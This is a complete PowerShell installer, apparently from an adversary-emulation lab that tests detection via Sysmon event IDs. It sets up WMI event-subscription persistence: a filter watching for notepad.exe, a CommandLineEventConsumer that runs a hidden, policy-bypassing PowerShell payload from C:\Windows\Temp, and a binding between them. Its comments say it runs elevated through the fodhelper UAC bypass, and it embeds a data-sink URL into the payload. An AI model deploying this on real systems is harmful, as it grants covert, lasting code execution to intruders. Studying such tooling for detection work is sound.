# S3 - WMI persistence install. Runs elevated (hidden) via the fodhelper UAC bypass.
# Reads payloads/consumer.ps1, injects the run-scoped config, writes the consumer to
# C:\Windows\Temp\svhw.ps1, then registers the filter / consumer / binding
# (idempotent: prior objects of the same names are removed first).
#
# Run-scoped config (embedded at build time by the operator):
$RunId    = "RUN-20261003-03"
$SinkBase = "http://192.168.106.1:9180"   # e.g. http://<lab-host>:9180
$VictimHost = "wmi"

$ConsumerPath = "C:\Windows\Temp\svhw.ps1"
$FilterName   = "NotepadFilter"
$ConsumerName = "SystemDumpConsumer"

# --- materialize consumer with run-scoped config ------------------------------
$source = Join-Path $PSScriptRoot "consumer.ps1"
if (-not (Test-Path $source)) { Write-Host "[S3] missing consumer.ps1 next to installer"; exit 1 }
# byte-fidelity read/write (no BOM, no line-ending conversion) so the on-disk
# svhw.ps1 is byte-identical to the staged consumer and the EID 11 hash of the write
# event equals the staged artifact hash (module-integrity link).
$body = [System.IO.File]::ReadAllText($source, [System.Text.Encoding]::UTF8)
$body = $body.Replace("RUN-20261003-03", $RunId).Replace("http://192.168.106.1:9180", $SinkBase).Replace("wmi", $VictimHost)
[System.IO.File]::WriteAllText($ConsumerPath, $body,
    (New-Object System.Text.UTF8Encoding($false)))
if (-not (Test-Path $ConsumerPath)) { Write-Host "[S3] consumer write failed"; exit 1 }

# config-carry-over verification (run id inside the artifact, not just the path)
$written = [System.IO.File]::ReadAllText($ConsumerPath, [System.Text.Encoding]::UTF8)
if (-not $written.Contains($RunId)) { Write-Host "[S3] run id missing in written consumer"; exit 1 }
Write-Host "[S3] consumer materialized: $ConsumerPath (run $RunId)"

# --- idempotent removal of a prior subscription -------------------------------
# Verified removal: Set-WmiInstance is create-or-update, so a leftover object would
# be UPDATED (no EID 20/21 Created events) instead of re-created. Removal must
# actually succeed before the create steps, otherwise the registration sequence
# evidence (19/20/21 all Created) is lost.
function Remove-SubscriptionObjects {
    $FilterNameX = $FilterName
    $ConsumerNameX = $ConsumerName
    for ($i = 0; $i -lt 3; $i++) {
        # test-debris from config validation phases (kept names Dsh*) - purge them so
        # the baseline is pristine; these are lab-internal markers, never produced by
        # the chain itself.
        $bindings = @(Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -match $FilterNameX -or $_.Consumer -match $ConsumerNameX -or $_.Filter -match 'Dsh' -or $_.Consumer -match 'Dsh' })
        foreach ($b in $bindings) { try { $b | Remove-WmiObject -ErrorAction Stop } catch {} }
        $consumers = @(Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $ConsumerNameX -or $_.Name -like 'Dsh*' })
        foreach ($c in $consumers) { try { $c | Remove-WmiObject -ErrorAction Stop } catch {} }
        $filters = @(Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $FilterNameX -or $_.Name -like 'Dsh*' })
        foreach ($f in $filters) { try { $f | Remove-WmiObject -ErrorAction Stop } catch {} }
        Start-Sleep -Milliseconds 700
        $left = @(Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $FilterNameX -or $_.Name -like 'Dsh*' }).Count +
               @(Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $ConsumerNameX -or $_.Name -like 'Dsh*' }).Count
        if ($left -eq 0) { return $true }
    }
    return $false
}

if (-not (Remove-SubscriptionObjects)) {
    Write-Host "[S3] could not purge prior subscription objects; aborting"
    exit 1
}
Write-Host "[S3] prior objects removed (verified)"
Start-Sleep -Milliseconds 500

# --- register filter / consumer / binding --------------------------------------
Write-Host "[S3] registering __EventFilter ($FilterName)"
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name           = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
} -ErrorAction Stop

Write-Host "[S3] registering CommandLineEventConsumer ($ConsumerName)"
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name                = $ConsumerName
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -noni -f `"$ConsumerPath`""
    RunInteractively    = $false
} -ErrorAction Stop

Write-Host "[S3] registering __FilterToConsumerBinding"
$binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $filter
    Consumer = $consumer
} -ErrorAction Stop

Write-Host "[S3] persistence installed: filter=$FilterName consumer=$ConsumerName trigger=notepad.exe"